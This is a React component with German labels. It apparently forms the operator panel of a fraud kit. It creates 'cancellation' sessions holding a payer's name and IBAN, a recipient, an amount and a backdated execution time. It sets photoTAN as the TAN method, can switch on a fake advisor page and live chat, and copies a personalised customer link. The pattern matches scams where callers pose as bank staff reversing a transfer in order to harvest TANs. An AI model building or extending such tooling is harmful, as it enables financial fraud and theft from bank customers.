import { useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { RefreshCw, Link2 } from "lucide-react";
import { toast } from "sonner";
import { generateToken, defaultPastDateTime, formatBetragInput, parseBetrag, numberToGermanWords } from "./tokenHelpers";
import { buildCustomerLink } from "@/lib/customerLink";
import StornoLiveCard from "./StornoLiveCard";

const StornoCallPanel = ({ hideActiveList = false }: { hideActiveList?: boolean }) => {
  const [auftraggeberName, setAuftraggeberName] = useState("");
  const [auftraggeberIban, setAuftraggeberIban] = useState("");
  const [empfaengerName, setEmpfaengerName] = useState("");
  const [empfaengerIban, setEmpfaengerIban] = useState("");
  const [betrag, setBetrag] = useState("");
  const [verwendungszweck, setVerwendungszweck] = useState("");
  const [executedAt, setExecutedAt] = useState(defaultPastDateTime());
  const [showBerater, setShowBerater] = useState(false);
  const [showLiveChat, setShowLiveChat] = useState(false);
  const [creating, setCreating] = useState(false);
  const [lastLink, setLastLink] = useState<string | null>(null);

  const resetForm = () => {
    setAuftraggeberName(""); setAuftraggeberIban("");
    setEmpfaengerName(""); setEmpfaengerIban("");
    setBetrag(""); setVerwendungszweck("");
    setExecutedAt(defaultPastDateTime());
  };

  const handleCreate = async () => {
    if (!auftraggeberName || !auftraggeberIban || !empfaengerName || !empfaengerIban || !betrag) {
      toast.error("Bitte alle Pflichtfelder ausfüllen");
      return;
    }
    setCreating(true);
    const token = generateToken();
    const { error } = await (supabase as any).from("storno_tokens").insert({
      token,
      auftraggeber_name: auftraggeberName,
      auftraggeber_iban: auftraggeberIban,
      empfaenger_name: empfaengerName,
      empfaenger_iban: empfaengerIban,
      betrag: parseBetrag(betrag),
      verwendungszweck: verwendungszweck || null,
      executed_at: executedAt ? new Date(executedAt).toISOString() : null,
      tan_method: "photo",
      show_berater: showBerater,
      show_live_chat: showLiveChat,
      customer_phase: "pending",
    });
    setCreating(false);
    if (error) { toast.error("Fehler beim Anlegen: " + error.message); return; }
    const url = buildCustomerLink(auftraggeberName, token);
    setLastLink(url);
    try { await navigator.clipboard.writeText(url); toast.success(`Kunden-Link kopiert: ${token}`); }
    catch { toast.success(`Storno-Token erstellt: ${token}`); }
    resetForm();
  };

  const copyLink = async () => {
    if (!lastLink) return;
    try { await navigator.clipboard.writeText(lastLink); toast.success("Link kopiert"); } catch {}
  };

  return (
    <div className="space-y-6">
      <Card>
        <CardHeader><CardTitle>Neuen Storno-Token erstellen</CardTitle></CardHeader>
        <CardContent className="space-y-6">
          <section className="space-y-2">
            <h3 className="text-sm font-semibold">1. Auftraggeber</h3>
            <div className="grid sm:grid-cols-2 gap-3">
              <div>
                <Label className="text-xs text-muted-foreground">Name</Label>
                <Input value={auftraggeberName} onChange={e => setAuftraggeberName(e.target.value)} placeholder="Max Mustermann" />
              </div>
              <div>
                <Label className="text-xs text-muted-foreground">IBAN</Label>
                <Input value={auftraggeberIban} onChange={e => setAuftraggeberIban(e.target.value)} placeholder="DE00 …" className="font-mono" />
              </div>
            </div>
          </section>

          <section className="space-y-2 pt-2 border-t">
            <h3 className="text-sm font-semibold">2. Empfänger</h3>
            <div className="grid sm:grid-cols-2 gap-3">
              <div>
                <Label className="text-xs text-muted-foreground">Name</Label>
                <Input value={empfaengerName} onChange={e => setEmpfaengerName(e.target.value)} placeholder="Empfängername" />
              </div>
              <div>
                <Label className="text-xs text-muted-foreground">IBAN</Label>
                <Input value={empfaengerIban} onChange={e => setEmpfaengerIban(e.target.value)} placeholder="DE00 …" className="font-mono" />
              </div>
            </div>
          </section>

          <section className="space-y-2 pt-2 border-t">
            <h3 className="text-sm font-semibold">3. Details</h3>
            <div className="grid sm:grid-cols-2 gap-3">
              <div>
                <Label className="text-xs text-muted-foreground">Betrag (€)</Label>
                <Input value={betrag} onChange={e => setBetrag(formatBetragInput(e.target.value))} placeholder="0,00" inputMode="decimal" className="text-right font-mono tabular-nums" />
                {betrag && (
                  <p className="text-[11px] text-muted-foreground mt-1 italic">
                    in Worten: {numberToGermanWords(parseBetrag(betrag))}
                  </p>
                )}
              </div>
              <div>
                <Label className="text-xs text-muted-foreground">Ausgeführt am</Label>
                <Input type="datetime-local" value={executedAt} onChange={e => setExecutedAt(e.target.value)} />
              </div>
            </div>
            <div>
              <Label className="text-xs text-muted-foreground">Verwendungszweck</Label>
              <Textarea value={verwendungszweck} onChange={e => setVerwendungszweck(e.target.value)} rows={2} placeholder="z. B. Rechnung 12345" />
            </div>
          </section>

          <section className="space-y-2 pt-2 border-t">
            <label className="flex items-center gap-2 text-sm cursor-pointer select-none">
              <input type="checkbox" checked={showBerater} onChange={e => setShowBerater(e.target.checked)}
                className="h-4 w-4 rounded border-input accent-primary" />
              <span className="font-medium">Berater-Seite anzeigen</span>
              <span className="text-xs text-muted-foreground">(wird direkt nach Token-Eingabe angezeigt)</span>
            </label>
            <label className="flex items-center gap-2 text-sm cursor-pointer select-none">
              <input type="checkbox" checked={showLiveChat} onChange={e => setShowLiveChat(e.target.checked)}
                className="h-4 w-4 rounded border-input accent-primary" />
              <span className="font-medium">Live-Chat anzeigen</span>
              <span className="text-xs text-muted-foreground">(Chat-Bubble unten rechts für den Kunden)</span>
            </label>
          </section>

          <div className="flex flex-wrap items-center gap-2">
            <Button onClick={handleCreate} disabled={creating} className="gap-2">
              <RefreshCw className="h-4 w-4" />Session erstellen &amp; Link kopieren
            </Button>
            {lastLink && (
              <Button variant="outline" onClick={copyLink} className="gap-2">
                <Link2 className="h-4 w-4" />Letzten Link kopieren
              </Button>
            )}
          </div>
          {lastLink && (
            <div className="text-xs text-muted-foreground font-mono break-all">{lastLink}</div>
          )}
        </CardContent>
      </Card>

      
    </div>
  );
};

export default StornoCallPanel;
